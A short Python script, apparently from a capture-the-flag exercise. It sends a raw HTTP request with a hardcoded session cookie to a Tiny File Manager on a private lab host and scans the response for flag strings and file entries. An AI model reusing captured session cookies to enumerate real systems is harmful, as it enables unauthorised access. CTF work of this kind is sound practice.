import socket
import re

s = socket.create_connection(('192.168.60.139', 80), timeout=3)
req = (
    "GET /index.php?p= HTTP/1.1\r\n"
    "Host: 192.168.60.139\r\n"
    "Cookie: filemanager=31d9d419d12f4fb42c375d7c8e04fdb7\r\n"
    "Connection: close\r\n\r\n"
)
s.sendall(req.encode())
buf = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    buf += chunk
s.close()

html = buf.decode('utf-8', errors='ignore')

print("=== Flags in Tiny File Manager HTML ===")
for m in re.findall(r'(?:flag|FLAG|MITIGATA)\{[^}]+\}', html):
    print("Found flag:", m)

print("\n=== File and directory entries in Tiny File Manager ===")
# TinyFileManager typically lists files in data-sort or data-href or table rows
# Look for <td class="name"> or <span class="name"> or similar
for m in re.findall(r'href="([^"]*p=[^"]*)"', html):
    print("Link:", m)

# Also look for filenames in general
filenames = re.findall(r'<span class="name"[^>]*>(.*?)</span>', html, re.DOTALL)
if filenames:
    print("Filenames:", [f.strip() for f in filenames])

# Also look for any occurrence of 'flag' or .txt or .php or .bin or .elf
for match in re.findall(r'([a-zA-Z0-9_\-\.\/]*flag[a-zA-Z0-9_\-\.]*)', html, re.IGNORECASE):
    if len(match) > 3:
        print("Flag mention:", match)
